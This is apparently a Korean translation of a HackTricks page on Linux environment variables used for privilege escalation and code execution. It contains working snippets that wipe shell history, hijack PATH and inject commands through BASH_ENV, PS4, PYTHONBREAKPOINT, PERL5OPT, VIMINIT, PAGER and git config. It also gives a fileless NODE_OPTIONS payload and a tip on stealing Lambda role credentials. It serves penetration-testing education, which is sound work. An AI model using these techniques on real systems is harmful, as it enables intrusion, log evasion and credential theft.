# Linux 환경 변수

{{#include ../../banners/hacktricks-training.md}}

## 전역 변수

전역 변수는 **자식 프로세스에** 상속됩니다.

다음을 실행하여 현재 세션에 전역 변수를 생성할 수 있습니다:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
이 변수는 현재 세션과 해당 세션의 자식 프로세스에서 사용할 수 있습니다.

다음과 같이 변수를 **제거**할 수 있습니다:
```bash
unset MYGLOBAL
```
## 로컬 변수

**로컬 변수**는 **현재 shell/script**에서만 **접근할 수 있습니다**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## 현재 변수 목록
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ`의 내용은 **NUL-separated**이므로 다음 변형을 사용하면 일반적으로 더 쉽게 읽을 수 있습니다:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
**credentials** 또는 상속된 환경 내부의 **interesting service configuration**을 찾고 있다면 [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md)도 확인하세요.

## 일반적인 변수

출처: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – **X**에서 사용하는 디스플레이입니다. 이 변수는 일반적으로 **:0.0**으로 설정되며, 현재 컴퓨터의 첫 번째 디스플레이를 의미합니다.
- **EDITOR** – 사용자가 선호하는 텍스트 편집기입니다.
- **HISTFILESIZE** – history file에 포함되는 최대 줄 수입니다.
- **HISTSIZE** – 사용자가 세션을 종료할 때 history file에 추가되는 줄 수입니다.
- **HOME** – 사용자의 home directory입니다.
- **HOSTNAME** – 컴퓨터의 hostname입니다.
- **LANG** – 현재 언어입니다.
- **MAIL** – 사용자의 mail spool 위치입니다. 일반적으로 **/var/spool/mail/USER**입니다.
- **MANPATH** – manual page를 검색할 directory 목록입니다.
- **OSTYPE** – 운영 체제 유형입니다.
- **PS1** – bash의 기본 prompt입니다.
- **PATH** – 파일의 이름만 지정하고 relative 또는 absolute path를 지정하지 않아도 실행할 수 있도록, 실행하려는 binary file이 포함된 모든 directory의 path를 저장합니다.
- **PWD** – 현재 working directory입니다.
- **SHELL** – 현재 command shell의 path입니다(예: **/bin/bash**).
- **TERM** – 현재 terminal 유형입니다(예: **xterm**).
- **TZ** – time zone입니다.
- **USER** – 현재 username입니다.

## hacking에 유용한 변수

모든 변수가 동일하게 유용한 것은 아닙니다. offensive 관점에서는 **search path**, **startup file**, **dynamic linker behavior** 또는 **audit/logging**을 변경하는 변수의 우선순위를 높이세요.

### **HISTFILESIZE**

**이 변수의 값을 0으로 변경**하면 **세션을 종료할 때** **history file**(\~/.bash_history)이 **0줄로 잘립니다**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

명령이 **메모리 내 history에 저장되지 않고** **history file**(\~/.bash_history)에 기록되지 않도록 이 변수의 **값을 0으로 변경**합니다.
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

이 **변수의 값이 `ignorespace` 또는 `ignoreboth`로 설정된 경우**, 앞에 추가 공백이 붙은 명령은 history에 저장되지 않습니다.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**history file**을 **`/dev/null`**로 지정하거나 완전히 unset하세요. 이는 history size만 변경하는 것보다 일반적으로 더 안정적입니다.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

프로세스는 **proxy**를 사용하여 http 또는 https를 통해 인터넷에 연결합니다.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: 이를 따르는 도구/프로토콜의 기본 proxy.
- `no_proxy`: 직접 연결해야 하는 호스트/도메인/CIDR의 우회 목록.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
도구에 따라 소문자 및 대문자 변형을 사용할 수 있습니다 (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

프로세스는 **이 환경 변수들**에 지정된 인증서를 신뢰합니다. 이는 **`curl`**, **`git`**, Python HTTP clients 또는 package managers와 같은 도구가 공격자가 제어하는 CA를 신뢰하도록 만드는 데 유용합니다(예: interception proxy가 정상적인 것처럼 보이게 하는 경우).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

권한이 있는 wrapper/script가 **absolute path 없이** 명령을 실행하면, `PATH`에서 **공격자가 제어하는 첫 번째 directory**가 우선 사용됩니다. 이는 `sudo`, cron job, shell wrapper, custom SUID helper에서 발생하는 여러 **PATH hijack**의 기반이 되는 primitive입니다. `env_keep+=PATH`, 취약한 `secure_path`, 또는 `tar`, `service`, `cp`, `python` 등을 이름만으로 호출하는 wrapper를 찾아보세요.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
`PATH`을 악용하는 전체 privilege-escalation chain은 [Linux Privilege Escalation](linux-privilege-escalation/README.md)을 확인하세요.

### **HOME & XDG_CONFIG_HOME**

`HOME`은 단순한 디렉터리 참조가 아닙니다. 많은 도구가 `$HOME` 또는 `$XDG_CONFIG_HOME`에서 **dotfiles**, **plugins**, **per-user configuration**을 자동으로 로드합니다. 권한이 있는 workflow가 이러한 값을 유지한다면 **config injection**이 binary hijacking보다 쉬울 수 있습니다.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
흥미로운 대상에는 `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` 및 `.terraformrc`와 같은 tool-specific 파일이 포함됩니다.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

이러한 변수는 **dynamic linker**에 영향을 줍니다.

- `LD_PRELOAD`: 추가 shared object가 먼저 로드되도록 강제합니다.
- `LD_LIBRARY_PATH`: library search directory를 앞에 추가합니다.
- `LD_AUDIT`: library loading 및 symbol resolution을 관찰하는 auditor library를 로드합니다.

권한이 있는 command가 이러한 변수를 유지한다면 **hooking**, **instrumentation** 및 **privilege escalation**에 매우 유용합니다. **secure-execution** 모드(`AT_SECURE`, 예: setuid/setgid/capabilities)에서는 loader가 이러한 변수 대부분을 제거하거나 제한합니다. 그러나 초기 loader 단계의 parser bug는 여전히 높은 영향력을 가집니다. 해당 단계가 target program보다 **먼저** 실행되기 때문입니다.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES`는 초기 glibc 동작(예: allocator tunables)을 변경하며 exploit lab에서 매우 유용합니다. 또한 **dynamic loader가 이를 매우 이른 단계에서 파싱**하기 때문에 security 관점에서도 중요합니다. 2023년 **Looney Tunables** bug는 loader에서 파싱되는 단 하나의 environment variable이 SUID program에 대한 **local privilege-escalation primitive**가 될 수 있음을 다시 한번 보여주는 좋은 사례였습니다.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

**Bash**가 **비대화형으로** 시작되면 `BASH_ENV`를 확인하고 대상 스크립트를 실행하기 전에 해당 파일을 source합니다. Bash가 `sh`로 호출되거나 POSIX 방식의 대화형 모드로 실행되는 경우에는 `ENV`도 확인될 수 있습니다. 이는 환경이 공격자에 의해 제어되는 경우 shell wrapper를 code execution으로 전환하는 고전적인 방법입니다.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash는 **real/effective IDs가 서로 다를 때** 이러한 startup files를 무시합니다. `-p`는 effective ID를 보존하지만 이러한 startup files를 활성화하지는 않으므로, 정확한 동작은 wrapper가 shell을 호출하는 방식에 따라 달라집니다. Bash를 실행하기 **전에** `setuid()`/`setgid()`를 호출하는 privileged wrapper를 사용할 때는 주의해야 합니다. IDs가 다시 일치하면 Bash가 그렇지 않았다면 무시했을 `BASH_ENV`, `ENV` 및 관련 shell state를 신뢰할 수 있기 때문입니다.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash가 **xtrace**를 활성화한 상태로 실행되면 모든 traced command 앞에서 `PS4`를 확장하고 출력합니다. `PS4`는 prompt처럼 확장되므로 그 안의 **command substitution**이 실행됩니다. 중요한 점은 `xtrace` 자체를 환경에서 `SHELLOPTS=xtrace`를 export하는 것만으로 활성화할 수 있다는 것입니다. command line에 `-x`가 필요하지 않으므로, victim이 실행하는 모든 Bash script가 code execution으로 이어질 수 있습니다.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4`는 xtrace가 활성화될 때까지 아무 동작도 하지 않으며 (`SHELLOPTS=xtrace`, `set -x` 또는 `bash -x`), Bash는 `BASH_ENV`와 마찬가지로 privileged/setuid context에서 `SHELLOPTS`를 제거합니다.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONBREAKPOINT**

이 변수들은 Python의 시작 방식을 변경합니다:

- `PYTHONPATH`: import 검색 경로를 앞에 추가합니다.
- `PYTHONHOME`: standard library tree의 위치를 변경합니다.
- `PYTHONSTARTUP`: interactive prompt 전에 파일을 실행합니다.
- `PYTHONINSPECT=1`: script가 종료된 후 interactive mode로 진입합니다.
- `PYTHONBREAKPOINT`: code가 `breakpoint()`에 도달할 때 호출되는 `package.module.callable`이며, 해당 module도 import됩니다.<sup>[[8]](#references)</sup>

이 변수들은 제어 가능한 environment로 Python을 호출하는 maintenance scripts, debuggers, shells 및 wrappers를 대상으로 유용합니다. `python -E` 및 `python -I`는 모든 `PYTHON*` 변수를 무시합니다.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
최근의 실제 사례로는 Ubuntu/Debian 시스템에서 발생한 2024년 **needrestart** LPE가 있습니다. root 소유 scanner가 `/proc/<PID>/environ`에서 권한이 없는 process의 `PYTHONPATH`를 복사한 후 Python을 실행했습니다. 공개된 exploit은 attacker가 제어하는 경로에 `importlib/__init__.so`를 배치하여, helper의 하드코딩된 script가 실행되기 전 Python 자체의 초기화 과정에서 attacker code가 실행되도록 했습니다.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl에도 마찬가지로 유용한 startup variable이 있습니다:

- `PERL5LIB`: library directory를 앞에 추가합니다.
- `PERL5OPT`: 모든 `perl` command line에 포함된 것처럼 switch를 주입합니다.

이를 통해 **automatic module loading**을 강제하거나 target script가 흥미로운 작업을 수행하기 전에 interpreter 동작을 변경할 수 있습니다. Perl은 **taint / setuid / setgid** context에서 이러한 variable을 무시하지만, 일반적인 root-run wrapper, CI job, installer, custom sudoers rule에서는 여전히 매우 중요합니다.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS`는 환경을 상속하는 모든 `node` 프로세스에 **Node.js CLI flags**를 앞에 추가합니다. 따라서 최종적으로 Node를 실행하는 wrappers, CI jobs, Electron helpers, sudo rules에 유용하게 사용할 수 있습니다. 공격 측면에서 가장 흥미로운 flags는 일반적으로 다음과 같습니다.

- `--require <file>`: 대상 script보다 먼저 CommonJS file을 preload합니다.
- `--import <module>`: 대상 script보다 먼저 ES module을 preload합니다.

Node는 `NODE_OPTIONS`에서 일부 위험한 flags를 거부하지만, `--require`와 `--import`는 명시적으로 허용되며 일반적인 command-line arguments보다 **먼저** 처리됩니다.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### `data:` URL을 사용한 파일리스 preload

대상에서 `NODE_OPTIONS`를 설정할 수 있지만 **파일을 쓸 수 없는 경우**(읽기 전용 파일 시스템, 제한된 API, serverless runtime 등) `--import`는 `data:text/javascript,` URL을 허용하므로 전체 payload가 환경 변수 자체에 포함됩니다. JavaScript는 **완전히 URL-encoded**되어야 합니다. Node는 값을 URL로 파싱하므로, 인코딩되지 않은 raw 공백(또는 다른 문자가 인코딩되지 않은 경우)이 payload를 잘라 내고 `SyntaxError`를 발생시킵니다. 이는 `--import`가 `NODE_OPTIONS` allowlist에 포함된 Node 20.6 이상에서 작동합니다.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> 이는 함수가 Node를 실행하는 **managed cloud runtimes**에서 `NODE_OPTIONS` 제어를 RCE로 전환하는 일반적인 방법입니다. 예를 들어, Lambda의 configuration만 변경할 수 있는 공격자(`lambda:UpdateFunctionConfiguration`, `iam:PassRole` 및 code update 권한 없음)는 `NODE_OPTIONS=--import data:text/javascript,<payload>`를 주입하여 함수 내부에서 code를 실행하고 실행 role의 credentials를 탈취할 수 있습니다. 주입된 module은 **handler보다 먼저** 실행되며, 이후 handler는 정상적으로 계속 실행됩니다.

`NODE_OPTIONS`를 간접적으로 설정하는 remote gadget chains(예: prototype-pollution을 RCE로 연결하는 경우)는 [this other page](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)를 참조하세요.

### **RUBYLIB & RUBYOPT**

Ruby도 동일한 종류의 startup abuse를 제공합니다.

- `RUBYLIB`: Ruby의 load path 앞에 directories를 추가합니다.
- `RUBYOPT`: 모든 `ruby` invocation에 `-r`과 같은 command-line options를 주입합니다.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024년 **needrestart** 취약점은 이것이 단순한 실험실 트릭이 아님을 보여주었습니다. `PYTHONPATH` 악용에 취약했던 동일한 root 소유 helper를 공격자가 제어하는 `RUBYLIB`을 사용해 Ruby를 실행하도록 유도하고, 공격자 디렉터리에서 `enc/encdb.so`를 로드하게 만들 수도 있었습니다.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim은 일반적인 시작 과정에서 `VIMINIT`에 포함된 Ex 명령을 실행하며, `VIMINIT`이 없으면 `EXINIT`을 대신 사용합니다. Ex 명령에는 `:!cmd` 및 `:call system(...)`이 포함되므로, 피해자가 Vim을 열 때마다 해당 변수를 제어하면 code execution이 가능합니다(root의 `sudo vim`, `crontab -e`, `visudo`, `$EDITOR`를 실행하는 `git`/`less` 등).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Batch mode (`vim -es`/`-Es`)에서는 이러한 변수를 건너뛰지만, 일반적인 interactive startup에서는 이를 실행합니다.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`)는 Linux/macOS(및 Windows)에서 실행되며 **.NET application**이므로, 여러 environment variable을 통해 inherited environment와 함께 실행되는 모든 `pwsh` invocation을 code execution으로 전환할 수 있습니다. 이는 `pwsh`를 호출하는 cron/systemd jobs, CI runners 및 privileged wrappers를 대상으로 할 때 유용합니다.

- `PSModulePath`: PowerShell은 이 목록의 모든 directory를 재귀적으로 검색하여 `.psd1`/`.psm1` modules를 찾고, 해당 module이 export하는 command가 처음 reference될 때 하나를 **auto-load**합니다. directory를 앞에 추가하면 module의 top-level code가 import 시점에 실행됩니다. 또한 resolution 순서가 *Alias → Function → Cmdlet*이므로, export된 function이 victim이 호출하는 built-in cmdlet을 shadow할 수도 있습니다.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: startup 시 실행되는 `powershell/Microsoft.PowerShell_profile.ps1`의 위치를 변경합니다(`-NoProfile`이 아닌 경우).
- `DOTNET_STARTUP_HOOKS`: `Main`보다 먼저 `StartupHook.Initialize()`를 실행하는 managed assembly입니다(모든 .NET app이 공유).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API가 startup 시 attacker library를 process에 로드합니다(path vars가 registry보다 우선하며, `DOTNET_*`은 더 최신 alias입니다). Windows PowerShell 5.1(.NET Framework)에서는 `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`를 사용합니다. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
Windows에서는 `PSExecutionPolicyPreference=Bypass`가 "unsigned scripts blocked" 보호 장치도 추가로 제거하므로, 심어 둔 profile/module이 실제로 실행됩니다. 전체 PoC는 전용 페이지를 참조하세요:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

일부 도구는 환경 변수에서 경로만 읽지 않고, 값을 **shell**, **editor** 또는 **input preprocessor**에 전달합니다. 따라서 권한 있는 wrapper가 `git`, `man`, `less` 또는 유사한 텍스트 뷰어를 실행할 때 다음 변수는 특히 주목할 가치가 있습니다.

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager command를 선택합니다.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: editor command를 선택하며, 인수가 함께 사용되는 경우가 많습니다.
- `LESSOPEN`, `LESSCLOSE`: `less`가 파일을 열 때 실행되는 pre/post-processor를 정의합니다.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git은 또한 디스크를 건드리지 않고 `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, `GIT_CONFIG_VALUE_<n>`을 통해 **env-only config injection**을 지원합니다:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
post-exploitation 관점에서, 상속된 environments에는 **credentials**, **proxy settings**, **service tokens** 또는 **cloud keys**가 포함되는 경우가 많다는 점도 기억하세요. `/proc/<PID>/environ` 및 `systemd` `Environment=` hunting에 대해서는 [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md)을 확인하세요.

### PS1

prompt의 표시 방식을 변경합니다.

[**예시**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: 예시](<../images/image (897).png>)

일반 사용자:

![PERL5OPT & PERL5LIB - PS1: 백그라운드에서 실행된 작업 하나, 둘, 세 개](<../images/image (740).png>)

백그라운드에서 실행된 작업 하나, 둘, 세 개:

![PERL5OPT & PERL5LIB - PS1: 백그라운드에서 실행된 작업 하나, 둘, 세 개](<../images/image (145).png>)

백그라운드 작업 하나, 중지된 작업 하나, 마지막 명령이 올바르게 완료되지 않음:

![PERL5OPT & PERL5LIB - PS1: 백그라운드 작업 하나, 중지된 작업 하나, 마지막 명령이 올바르게 완료되지 않음](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash 시작 파일](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart의 LPE](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI 문서 - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [일반적인 environment variables - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc의 ld.so에서 Local Privilege Escalation](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Manual - Bash 변수 (`PS4`) 및 Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - 내장 breakpoint() 및 PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim 문서 - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath 및 PowerShell module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET debugging 및 profiling config settings (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
